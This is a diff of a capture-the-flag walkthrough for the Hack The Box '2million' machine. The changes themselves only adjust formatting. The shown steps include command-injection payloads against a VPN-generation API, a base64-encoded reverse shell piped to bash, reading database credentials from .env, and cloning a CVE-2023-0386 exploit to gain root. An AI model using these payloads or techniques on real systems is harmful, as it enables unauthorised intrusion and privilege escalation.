@@ -26,11 +26,11 @@ PORT   STATE SERVICE
 
 The scan result shows us there are two active ports: 22 (`ssh` port), 80 (`http` port).
 
-   4. My next step is checking the website of the given IP address and gain the url of the website:
+4. My next step is checking the website of the given IP address and gain the url of the website:
    ![alt text](images/pic.png)
 
-   5. I tried to fuzzing the website directories and vhosts using `ffuf` tool but I could not see anything helpful.
-   6. When I checked the website more carefully, I saw this page:
+5. I tried to fuzzing the website directories and vhosts using `ffuf` tool but I could not see anything helpful.
+6. When I checked the website more carefully, I saw this page:
    ![alt text](images/pic1.png)
    In this page, I had to type the correct invite code to make new account. In this pic, I opened `Inspect` tab (You can open this tab by hit `Ctr+Shift+I`) and I reloaded the page and noticed the `inviteapi.min.js` file. There was the code in this file:
 
@@ -72,8 +72,8 @@ function makeInviteCode()
 		,error:function(response)
 ```
 
-   7. The readable code showed us one important detail: when we `POST` data to the url: `'/api/v1/invite/how/to/generate` we will know how to get the correct invite code.
-   8. My next approach is using `curl` tool to `POST` the data to the url:
+7. The readable code showed us one important detail: when we `POST` data to the url: `'/api/v1/invite/how/to/generate` we will know how to get the correct invite code.
+8. My next approach is using `curl` tool to `POST` the data to the url:
 
 ```bash
 curl http://2million.htb/api/v1/invite/how/to/generate -X POST -i
@@ -122,10 +122,10 @@ echo "<CODE>" |base64 -d
 <INVITE_CODE>
 ```
 
-   9. After creating my account, I can access the `/home` page.
+9. After creating my account, I can access the `/home` page.
  ![alt text](images/pic5.png)
 
-   10.    Looked around, I noticed some interesting thing, especially in `/home/access` page, where allowed me to download the VPN collection pack file. Turned on the `Inpect` tab and clicked the download button, the `Inspect` tab showed that when the button was clicked, the page sent the `GET` request to the address: `http://2million.htb/api/v1/user/vpn/generate`. My approach idea in this case is: `/api/v1` is the place to make and return invite code, return VPN collection pack file so, maybe I could use `curl` and try to send various of request to `/api/v1` and see what happen.
+10.    Looked around, I noticed some interesting thing, especially in `/home/access` page, where allowed me to download the VPN collection pack file. Turned on the `Inpect` tab and clicked the download button, the `Inspect` tab showed that when the button was clicked, the page sent the `GET` request to the address: `http://2million.htb/api/v1/user/vpn/generate`. My approach idea in this case is: `/api/v1` is the place to make and return invite code, return VPN collection pack file so, maybe I could use `curl` and try to send various of request to `/api/v1` and see what happen.
     
 ```bash
 	curl http://2million.htb\/api\/v1 -v                                                                        
@@ -206,7 +206,7 @@ Pragma: no-cache
 
 This time the respone was `200 OK` and we had many thing to try.
 
-   11.   I tried with the `GET` request to `/api/v1/admin/auth` to check if my account is admin and gained the info that my account was a normal account. I tried to send `POST` request to `/api/v1/admin/vpn/generate` but it was `401 Unauthorized`. I noticed the line: `"PUT":{"/api/v1/admin/settings/update": "Update user settings"}` so I tried to sent some request:
+11.   I tried with the `GET` request to `/api/v1/admin/auth` to check if my account is admin and gained the info that my account was a normal account. I tried to send `POST` request to `/api/v1/admin/vpn/generate` but it was `401 Unauthorized`. I noticed the line: `"PUT":{"/api/v1/admin/settings/update": "Update user settings"}` so I tried to sent some request:
 
 ```bash
 curl http://2million.htb/api/v1/admin/settings/update -H 'Cookie: PHPSESSID=<MY_COOKIE>' -X PUT -d '' -H 'Content-Type: application/json' | jq
@@ -236,7 +236,7 @@ curl http://2million.htb/api/v1/admin/auth -H 'Cookie: PHPSESSID=<MY_COOKIE>' | 
 }
 ```
 
-   12.    I returned to `/api/v1/admin/vpn/generate` one more time and sent `POST` request to see the response. The response showed me that I could interact with `/api/v1/admin/vpn/generate` and generate the VPN for specific user. This means when I `POST` data, the API will bring it to backend server and after the handle process, backend server responses back to my computer. My next approach is using `command injection` technique:
+12.    I returned to `/api/v1/admin/vpn/generate` one more time and sent `POST` request to see the response. The response showed me that I could interact with `/api/v1/admin/vpn/generate` and generate the VPN for specific user. This means when I `POST` data, the API will bring it to backend server and after the handle process, backend server responses back to my computer. My next approach is using `command injection` technique:
 ```bash
 curl http://2million.htb/api/v1/admin/vpn/generate -H 'Cookie: PHPSESSID=<MY_COOKIE>' -X POST -d '{"username": "admin;whoami;"}' -H 'Content-Type: application/json'
 www-data
@@ -244,7 +244,7 @@ www-data
 
 The backend server response the output of `whoami` command is `www-data` which verifies that our `command injection` attack succesful. 
 
-   13.    From the hint in previous step, I tried to inject `reverse shell` in the command but it return nothing. Maybe I should encode our reverse shell to bypass the security system of backend server. I tried to encode my reverse shell to `base64`:
+13.    From the hint in previous step, I tried to inject `reverse shell` in the command but it return nothing. Maybe I should encode our reverse shell to bypass the security system of backend server. I tried to encode my reverse shell to `base64`:
 
 ```bash
 curl http://2million.htb/api/v1/admin/vpn/generate -H 'Cookie: PHPSESSID=<MY_COOKIE>' -X POST -d '{"username": "admin;echo '<BASE64_REVERSE_SHELL>'| base64 -d| bash;"}' -H 'Content-Type: application/json'
@@ -252,8 +252,8 @@ curl http://2million.htb/api/v1/admin/vpn/generate -H 'Cookie: PHPSESSID=<MY_COO
 
 By this way, I gained access to the server through `reverse shell`. (NOTE: Before inject reverse shell into target server, you have to open your computer port to hear the reverse signal from the server. My favourite tool to do this task is `nc`: `sudo nc -lvnp <Your_computer_port>`)
 
-   14.   I could only do some basic command in the server because my current identify in server was `www-data` user which has very low privilege. So, next step, let make some basic, general scan.
-   15.  One of the most important file to check is `.env` file. The `.env` file contain environment variables, sensitive data such as: DB_USERNAME, DB_PASSWORD,... The creators do not want to insert these environment variables and sensitive data into source code so they usually put them into `.env` file.
+14.   I could only do some basic command in the server because my current identify in server was `www-data` user which has very low privilege. So, next step, let make some basic, general scan.
+15.  One of the most important file to check is `.env` file. The `.env` file contain environment variables, sensitive data such as: DB_USERNAME, DB_PASSWORD,... The creators do not want to insert these environment variables and sensitive data into source code so they usually put them into `.env` file.
 
 ```bash
 www-data@2million:~/html$ find .env
@@ -267,7 +267,7 @@ DB_USERNAME=admin
 DB_PASSWORD=<ADMIN_PASSWORD>
 ```
 
-   16.  The `.env` file supplied us `DB_PASSWORD` and `DB_USERNAME` which allowed us to login to `ssh`.
+16.  The `.env` file supplied us `DB_PASSWORD` and `DB_USERNAME` which allowed us to login to `ssh`.
 
 ```bash
 ssh admin@<IP_ADDRESS>
@@ -314,7 +314,8 @@ admin@2million:~$
 
 After this step, I could interact with server as user `admin` which gave me more privilege.
 
-   17.  Get the user flag: 
+17.  Get the user flag:
+
 ```bash
 admin@2million:~$ cd /home
 admin@2million:/home$ ls
@@ -326,8 +327,8 @@ admin@2million:~$ cat user.txt
 <USER_FLAG>
 ```
 
-   18.  Now we have to perform a `escalating privilege` attack to gain the `root` privilege.
-   19. I noticed the detail: `You have mail` and it inspired me to check the mail box of `admin` user located in `/var/mail/`
+18.   Now we have to perform a `escalating privilege` attack to gain the `root` privilege.
+19.  I noticed the detail: `You have mail` and it inspired me to check the mail box of `admin` user located in `/var/mail/`
 
 ```bash
 admin@2million:~$ cd /var/mail/
@@ -349,11 +350,12 @@ I'm know you're working as fast as you can to do the DB migration. While we're p
 HTB Godfather
 ```
 
-   20.   In this mail, the sender noticed about one important detail: this server had `OverlayFS / FUSE` vulnerability (CVE-2023-0386) which could lead to `escalating privilege`!! So, I searched for this vulnerability and how to exploit it. I found the payload to exploit this vulnerability on the Internet (You can visit this website and learn more about how to exploit this vulnerability: `https://hackindex.io/vulnerabilities/CVE-2023-0386`)
-   21.  Follow the instruction on the website, I gained the `root` privilege:
+20.   In this mail, the sender noticed about one important detail: this server had `OverlayFS / FUSE` vulnerability (CVE-2023-0386) which could lead to `escalating privilege`!! So, I searched for this vulnerability and how to exploit it. I found the payload to exploit this vulnerability on the Internet (You can visit this website and learn more about how to exploit this vulnerability: `https://hackindex.io/vulnerabilities/CVE-2023-0386`)
+21.  Follow the instruction on the website, I gained the `root` privilege:
    * On my computer:
   
   1. Git and prepared the files.
+
 ```bash
 ┌─[admin@parrot]─[~/Desktop]
 └──╼ $git clone https://github.com/puckiestyle/CVE-2023-0386.git
@@ -426,7 +428,7 @@ gcc -o gc getshell.c
     root@2million:~# 
     ```
 
-22.    The `escalating privilege` attack successful, currently I had the `root` privilege. The last step is go to `/root` directory and gain the flag:
+22. The `escalating privilege` attack successful, currently I had the `root` privilege. The last step is go to `/root` directory and gain the flag:
 
 ```bash
 root@2million:~# cd /root
